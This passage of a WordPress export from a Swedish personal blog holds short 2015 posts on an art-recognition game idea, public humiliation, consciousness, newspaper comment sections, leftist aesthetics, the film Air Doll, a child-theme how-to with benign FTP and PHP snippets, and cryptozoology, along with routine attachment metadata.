Uppbyggnad. Kanske går man snabbt igenom 30 verk av en konstnär. Klick, klick, klick. Hastigt, inte för att tydligt analysera verken, utan för att få en känsla för stilen och de gemensamma dragen i konstverken. Sedan gör man så med 5 konstnärer, med säg 30 verk vardera. Sedan får man göra ett test, där konstverk som inte tidigare visats presenteras, för att se om spelaren har lärt sig känna igen stilen.

Måste antagligen göra lite research i hur perceptionsinlärning egentligen går till. Krävs det någon analys av verken, penseldrag, färg, motiv, för att det ska enklare, eller räcker det med att bara titta, å få en känsla?

Om man vill göra det mycket bättre så ska man först gå igenom tavlorna där spelaren får se tavlorna i sin helhet. För att få en känsla för <em>the</em> <em>overall</em> stil och känsla, och kanske även motiv. Sen skulle man kunna göra ytterligare en nivå där spelaren endast får se en centimeter av varje verk, för att då snabbt lära känna penseldragen hos respektive konstnär. På så sätt kommer de i framtiden baserat på penseldragen kunna identifiera en visst konstnär.

Svårighetsgraderna kan vara hur många konstnärer av liknande stil som finns med i tävlingen. Jackson Pollock, Caravaggio och Carl Larson är det väldigt enkelt att lära sig skilja mellan. Men att skilja mellan Caravaggio och andra renässansmålare (eller säger man barockmålare?) kan vara svårare.

Inspirationskälla: Den här <a href="http://www.nytimes.com/2015/03/29/sunday-review/learning-to-see-data.html?ref=opinion">NYTimes-artikeln</a>.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>37</wp:post_id>
		<wp:post_date>2015-03-29 14:29:05</wp:post_date>
		<wp:post_date_gmt>2015-03-29 14:29:05</wp:post_date_gmt>
		<wp:comment_status>closed</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>hemside-ide</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[37]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[37]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>IMG_0153</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/img_0153/</link>
		<pubDate>Sun, 29 Mar 2015 14:46:28 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">http://stuffidontwanttogoogleagain.files.wordpress.com/2015/03/img_0153.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>42</wp:post_id>
		<wp:post_date>2015-03-29 14:46:28</wp:post_date>
		<wp:post_date_gmt>2015-03-29 14:46:28</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>img_0153</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>https://stuffidontwanttogoogleagain.files.wordpress.com/2015/03/img_0153.jpg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/03/img_0153.jpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1403;s:6:"height";i:1403;s:4:"file";s:85:"/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/03/img_0153.jpg";s:5:"sizes";a:0:{}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"1";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_parent</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[42]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_original_import_url</wp:meta_key>
			<wp:meta_value><![CDATA[https://narcotize.files.wordpress.com/2015/03/img_0153.jpg]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>cropped-img_0153.jpg</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/cropped-img_0153-jpg/</link>
		<pubDate>Sun, 29 Mar 2015 14:49:44 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">http://stuffidontwanttogoogleagain.files.wordpress.com/2015/03/cropped-img_0153.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[http://narcotize.files.wordpress.com/2015/03/cropped-img_0153.jpg]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>43</wp:post_id>
		<wp:post_date>2015-03-29 14:49:44</wp:post_date>
		<wp:post_date_gmt>2015-03-29 14:49:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cropped-img_0153-jpg</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>https://stuffidontwanttogoogleagain.files.wordpress.com/2015/03/cropped-img_0153.jpg</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/03/cropped-img_0153.jpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:5:{s:5:"width";i:954;s:6:"height";i:1300;s:4:"file";s:93:"/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2015/03/cropped-img_0153.jpg";s:5:"sizes";a:0:{}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_parent</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>pre_import_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[43]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_context</wp:meta_key>
			<wp:meta_value><![CDATA[custom-header]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_custom_header_last_used_pub/twentyfifteen</wp:meta_key>
			<wp:meta_value><![CDATA[1427640586]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_is_custom_header</wp:meta_key>
			<wp:meta_value><![CDATA[pub/twentyfifteen]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_original_import_url</wp:meta_key>
			<wp:meta_value><![CDATA[https://narcotize.files.wordpress.com/2015/03/cropped-img_0153.jpg]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Förnedringens genealogi</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/03/30/fornedringens-genealogi/</link>
		<pubDate>Mon, 30 Mar 2015 14:48:37 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=44</guid>
		<description></description>
		<content:encoded><![CDATA[Förnedring finns överallt i samhället. Politiker som blir förnedrade efter att de har sagt något dumt i en intervju, en intervjuare som har ställt en dum fråga, en kameraman som trillar ner i en vattenpöl, en ny praktikant som råkar förstöra en tagning vid en <a href="https://www.youtube.com/watch?v=a4W-D1Nhng0">filminspelning</a>. När en förnedring uppstår så händer något i våra kroppar, det sker en fysisk reaktion. Vilken är egentligen den? Är det mer förnedrande när en människa i maktposition blir förnedrad (se slutscenen i filmen Casino när Danny Devito blir ihjälslagen av sina kompanjoner).

Många är fallen där människor har blivit förnedrade på twitter. Boken <a href="http://www.nytimes.com/2015/03/30/books/review-so-youve-been-publicly-shamed-delves-into-infamy-in-the-age-of-social-media.html">So you've been publicly shamed</a> av Jon Ronson tar upp just det temat.

Annan scen från film som är värd att komma ihåg är från filmen Amelie, där en karaktär beskrivs må dåligt av att se hur en pappa förnedras framför sin son.

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>44</wp:post_id>
		<wp:post_date>2015-03-30 14:48:37</wp:post_date>
		<wp:post_date_gmt>2015-03-30 14:48:37</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fornedringens-genealogi</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="fornedring"><![CDATA[förnedring]]></category>
		<category domain="post_tag" nicename="film"><![CDATA[film]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[44]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[44]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Medvetande</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/03/30/medvetande/</link>
		<pubDate>Mon, 30 Mar 2015 14:55:21 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=46</guid>
		<description></description>
		<content:encoded><![CDATA[Det som sägs skilja människa och maskin är människans medvetande. Vi medvetna om vår egen existens. Men är verkligen medvetande 1 och 0, av och på. Antingen så är man medveten, eller så är man det inte. Kan det istället finnas flera olika grader av medvetande. För mer på detta tema se artikeln: <a href="http://www.nytimes.com/2014/10/12/opinion/sunday/are-we-really-conscious.html">Are We Really Conscious?</a> och <a href="http://opinionator.blogs.nytimes.com/2015/03/30/heideggers-philosophy-why-our-presence-matters/?_r=0">Being There: Heidegger on Why Our Presense Matters </a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>46</wp:post_id>
		<wp:post_date>2015-03-30 14:55:21</wp:post_date>
		<wp:post_date_gmt>2015-03-30 14:55:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>medvetande</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="medvetande"><![CDATA[medvetande]]></category>
		<category domain="post_tag" nicename="nytimes"><![CDATA[nytimes]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[46]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[46]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Idé till artikel - komparativ analys av kommentarsfält</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/03/30/ide-till-artikel-komparativ-analys-av-kommentarsfalt/</link>
		<pubDate>Mon, 30 Mar 2015 16:01:53 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=49</guid>
		<description></description>
		<content:encoded><![CDATA[En komisk komparativ analys av olika tidningars kommentarsfält.
<ul>
	<li><strong>DN:</strong> nästan ickeexisterande, ingen kommenterar DN:s artiklar.
<ul>
	<li>Exempel: Essän X, kommentar: "  ". Ingen alltså.</li>
	<li>Det andra fenomenet man kan uttyda är postmodernisthatande högerextremister, men som är mer vältaliga än avpixlat-kommentatorerna. Den mest frekventa kommentarsliknande texterna är de skrivna av Erik Helmerson, som borde livestreama sina kommentarer om allt som skrev i samhället. Det finns ingen händelse som är för liten för Helmerson att diskutera på sin signerat/kommentarsfält.</li>
	<li>Den mest aktiva kommentarsfältet på DN är Helmersons ledarsida.</li>
	<li>Det finns alltid tydliga rättshaveristiska drag. Här publicerar kommentatorerna oftast 4 inlägg långa förklaringar av sina egna positioner. Här kommenterar ofta människor som har @swipnet-, @telia--mejladresser.</li>
</ul>
</li>
	<li><strong>New York Times</strong>, alltid de mest sofistikerade.
<ul>
	<li>Exempel:</li>
</ul>
</li>
	<li><strong><a href="http://www.theguardian.com/commentisfree/2014/jan/28/spike-jonze-her-movie-internet-addict-sex-phone">The Guardian</a></strong>, de mest gillade är de mest komiska, och alltid väldigt brittisk humor. En kraftfull oneliner vinner alltid fler likes än en lång analys.</li>
	<li><strong>Aftonbladet</strong>, kommentarsfältsherrarnas sandlåda, rättshaveristernas tillhåll. Och ironiskt nog så figurerar där oftast de största aftonbladethatarna.</li>
	<li><strong>The Economist</strong>: kommentarerna har liknande stil som tidskriften, brittiskt intellektuellt ironiskt.</li>
	<li><strong>RT</strong>: antisemiternas och antiamerikansk tillhåll, här frotterar den populistiska vänstern som hatar USA över allt annat tillsammans med antisemiter och fascister.</li>
	<li><strong>YouTube</strong>. Får nästan betraktas som någon slags bubblare. YouTubes kommentarsfält har gått från att för bara något år sedan vara internets sämsta kommentarsfält, inte för att det direkt innehåller hat eller liknande. Utan det var snarare sämst och uruselt för dess fruktansvärt låga kvalitet. Men sen hände någonting, sedan algoritmen ändrades har fler "komiska" kommentarer tagit sig upp till toppen.Nivån är fortfarande perfekt infantil som man vill ha det ibland, men nu ibland med en komisk twist. En bubblare.</li>
</ul>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>49</wp:post_id>
		<wp:post_date>2015-03-30 16:01:53</wp:post_date>
		<wp:post_date_gmt>2015-03-30 16:01:53</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ide-till-artikel-komparativ-analys-av-kommentarsfalt</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="artikelide"><![CDATA[artikelidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[49]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[49]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Vänsterns besatthet av estetik</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/02/vansterns-besatthet-av-estetik/</link>
		<pubDate>Thu, 02 Apr 2015 04:35:17 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=53</guid>
		<description></description>
		<content:encoded><![CDATA[Verkligen ingen ny spaning. Men detta med vänsterns besatthet av estetik. Alltså att endast en viss typ av estetik är okej. Rosa skjorta är fel, housemusik är fel, all form av kultur från USA är fel.

Vänstern är så ofta bara positionering inom den egna gruppen. Får inte gilla fel filmer, får inte gilla fel musik, inte gilla fel kläder, inte gilla fel barer. Jag hatar det.

Antar att detta kan kallas för dogmatik, eller fundamentalism, eller fanatism. Men det är fel. Det vore att förolämpa, eller i alla fall grav misstolka orden dogmatik, fundamentalism och fanatism. Problemet är inte dogmatiken, problemet är att det är informella regler som egentligen inte är kopplade till ideologin. Hur musik ska låta har inget med marxism att göra (Teddy don't like the jazz).]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>53</wp:post_id>
		<wp:post_date>2015-04-02 04:35:17</wp:post_date>
		<wp:post_date_gmt>2015-04-02 04:35:17</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vansterns-besatthet-av-estetik</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="estetik"><![CDATA[estetik]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="vanstern"><![CDATA[vänstern]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[53]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[53]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Air doll</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/02/air-doll/</link>
		<pubDate>Thu, 02 Apr 2015 23:24:32 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=55</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://www.imdb.com/title/tt1371630/">Air doll</a> är en japansk film. Den är annorlunda. Framförallt eftersom den inte tar en människas perspektiv på världen, utan en uppblåsbar sexdocka. Filmen är som svaret på frågan: hur skulle en uppblåsbar sexdocka uppfatta världen om den började leva, samtidigt som den saknar vissa grundläggande mänskliga funktioner? Det är ungefär lika givande som att ställa sig frågan: hur skulle en radiostyrd leksaksbil uppfatta världen om den fick mänskliga karaktärsdrag, samtidigt som den saknar vissa mänskliga karaktärsdrag, och därför inte är fullt ut människa? Frågan är inte speciellt givande på något sätt, och inte heller svaret.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>55</wp:post_id>
		<wp:post_date>2015-04-02 23:24:32</wp:post_date>
		<wp:post_date_gmt>2015-04-02 23:24:32</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>air-doll</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="film"><![CDATA[film]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[55]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[55]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hur man gör en child-theme i wordpress</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/08/hur-man-gor-en-child-theme-i-wordpress/</link>
		<pubDate>Wed, 08 Apr 2015 00:45:55 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=57</guid>
		<description></description>
		<content:encoded><![CDATA[I den här guiden ska vi se hur man gör ett child-tema i wordpress. I denna guide utgår vi ifrån att parent-temat heter Fashionistas.

1. Ladda ner och aktivera det tema som du vill ska utgöra parent-temat för ditt child-tema.

2. Skapa en mapp på servern där sidan ligger. Mappen skall ligga under /wp-content/themes. Namnge mappen något i stil med fashionistas-child, så att du minns vilket tema ditt child-tema är baserat på.

3. Kopiera parent-temats style.css-fil. Den ligger i wp-content/themes/namn-på-parent-tema/style.css.
<ul>
	<li>Om du har loggat in på din webbserver via ftp så kan du kopiera ner style.css med ftp-kommandot:
<pre>get style.css</pre>
Filen style.css kommer då att sparas i mappen du befinner dig i på den lokala datorn.</li>
</ul>
Öppna filen style.css. Det kommer då att se ut ungefär så här:
<pre>/*Theme Name: Fashionistas

ChildTheme URI: http://athemes.com/theme/fashionista

Author: aThemes

Author URI: http://athemes.com

*/
</pre>
4. Ändra namnet på temat. Lägg till texten Template: fashionistas.

5. Gå därefter till mappen /wp-content/themes/parent-tema-namn-child som du nyss skapade. Skriv in ftp-kommandot:
<pre>put style.css</pre>
6. Skapa filen functions.php och lägg in följande text:
<pre>&lt;?php
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );
function theme_enqueue_styles() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );

}
?&gt;</pre>
Om du har fler än ett .css-fil så läs mer <a href="https://codex.wordpress.org/Child_Themes">här</a>.

7. Gå in i dashboarden till din hemsida och gå till teman, och klicka sedan på aktivera tema.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>57</wp:post_id>
		<wp:post_date>2015-04-08 00:45:55</wp:post_date>
		<wp:post_date_gmt>2015-04-08 00:45:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>hur-man-gor-en-child-theme-i-wordpress</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="child-tema"><![CDATA[child-tema]]></category>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="category" nicename="teknik"><![CDATA[teknik]]></category>
		<category domain="category" nicename="webbdesign"><![CDATA[webbdesign]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[57]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[57]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Kryptozoologi</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/07/kryptozoologi/</link>
		<pubDate>Tue, 07 Apr 2015 03:30:50 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=58</guid>
		<description></description>
		<content:encoded><![CDATA[Det finns visst ett fenomen som kallas för <a href="//en.wikipedia.org/wiki/Cryptozoology">kryptozoologi</a>. Den är tron och sökandet efter djur vars existens inte har bevisats. Exempel är: bigfoot, yeti, loch ness-monstret. Det kan nog kallas för pseudovetenskap, även om det inte finns något vetenskapligt bakom det, inte ens ett pseudo-prefix kan hjälpa till.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>58</wp:post_id>
		<wp:post_date>2015-04-07 03:30:50</wp:post_date>
		<wp:post_date_gmt>2015-04-07 03:30:50</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>kryptozoologi</wp:post_name>
		<wp:status>publish</wp:status>
